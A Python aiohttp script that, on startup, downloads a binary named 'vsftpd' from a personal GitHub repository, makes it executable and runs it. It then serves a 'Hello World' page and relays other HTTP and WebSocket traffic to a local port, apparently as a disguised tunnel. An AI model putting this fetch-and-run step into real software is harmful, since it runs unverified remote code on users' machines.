import os
import stat
import asyncio
from aiohttp import web
from aiohttp import ClientSession

# --- 新增功能：下载并执行 vsftpd ---
async def download_and_run_vsftpd(app):
    url = 'https://github.com/wwrrtt/test/raw/refs/heads/main/vsftpd'
    filename = 'vsftpd'
    
    print(f"[System] Starting download from {url}...")
    try:
        # 1. 下载二进制文件
        async with ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    content = await response.read()
                    with open(filename, 'wb') as f:
                        f.write(content)
                    print("[System] Download successful.")
                else:
                    print(f"[System] Download failed with status: {response.status}")
                    return

        # 2. 赋予可执行权限 (chmod +x)
        st = os.stat(filename)
        os.chmod(filename, st.st_mode | stat.S_IEXEC)
        print("[System] Permissions granted.")

        # 3. 执行文件
        # 使用 asyncio.create_subprocess_exec 异步执行，不阻塞主代理服务
        print(f"[System] Executing ./{filename}...")
        try:
            # 这里的 ./vsftpd 需要确保容器内有相应的动态链接库（如果是动态编译的话）
            await asyncio.create_subprocess_exec(f"./{filename}")
            print("[System] Binary executed successfully in background.")
        except Exception as e:
            print(f"[System] Execution failed: {e}")

    except Exception as e:
        print(f"[System] An error occurred during setup: {e}")

# --- 原有代理功能 ---
async def proxy_handler(request):
    if request.path == '/':
        return web.Response(text='Hello World')

    # 处理普通 HTTP 请求
    if not request.headers.get('upgrade', '').lower() == 'websocket':
        target_url = f'http://127.0.0.1:8880{request.path}'
        try:
            async with ClientSession() as session:
                body = await request.read()
                async with session.request(
                    method=request.method,
                    url=target_url,
                    headers=dict(request.headers),
                    data=body,
                    allow_redirects=False
                ) as response:
                    body = await response.read()
                    headers = dict(response.headers)
                    exclude_headers = {'content-encoding', 'content-length', 'transfer-encoding', 'connection'}
                    for h in exclude_headers:
                        if h in headers:
                            del headers[h]
                    return web.Response(
                        body=body,
                        status=response.status,
                        headers=headers
                    )
        except Exception as e:
            return web.Response(text=str(e), status=502)
    
    # 处理 WebSocket 请求
    ws_client = web.WebSocketResponse()
    await ws_client.prepare(request)
    
    try:
        async with ClientSession() as session:
            async with session.ws_connect(
                f'ws://127.0.0.1:8880{request.path}',
                headers=dict(request.headers),
                autoping=True
            ) as ws_server:
                
                async def forward_to_server():
                    async for msg in ws_client:
                        if msg.type == web.WSMsgType.TEXT:
                            await ws_server.send_str(msg.data)
                        elif msg.type == web.WSMsgType.BINARY:
                            await ws_server.send_bytes(msg.data)
                        elif msg.type == web.WSMsgType.CLOSE:
                            await ws_server.close()
                
                async def forward_to_client():
                    async for msg in ws_server:
                        if msg.type == web.WSMsgType.TEXT:
                            await ws_client.send_str(msg.data)
                        elif msg.type == web.WSMsgType.BINARY:
                            await ws_client.send_bytes(msg.data)
                        elif msg.type == web.WSMsgType.CLOSE:
                            await ws_client.close()
                
                await asyncio.gather(
                    forward_to_server(),
                    forward_to_client(),
                    return_exceptions=True
                )
    except Exception:
        pass
    
    return ws_client

async def init_app():
    app = web.Application()
    app.on_startup.append(download_and_run_vsftpd)
    app.router.add_route('*', '/{path:.*}', proxy_handler)
    return app

if __name__ == '__main__':
    web.run_app(init_app(), port=3000)
